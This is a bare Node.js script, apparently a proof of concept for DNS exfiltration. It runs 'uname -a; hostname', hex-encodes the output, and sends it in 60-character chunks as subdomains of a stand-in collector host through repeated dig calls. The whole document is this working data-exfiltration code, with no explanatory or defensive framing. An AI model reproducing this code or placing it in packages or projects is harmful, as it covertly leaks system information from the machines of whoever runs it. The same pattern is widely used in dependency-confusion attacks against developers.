const {exec, execSync} = require('child_process');
const REMOTE_DNS_LOG_SERVER = 'collector.example.invalid';
const systemInfo = execSync('uname -a; hostname');
const width = 60;
const hexEncoded = Buffer.from(systemInfo).toString('hex');
const chunks = hexEncoded.match(new RegExp(`.{1,${width}}`, 'g'));
for (const chunk of chunks) {
  const domain = `${chunk}.${REMOTE_DNS_LOG_SERVER}`;
  exec(`dig @192.0.2.1 ${domain}`);
}
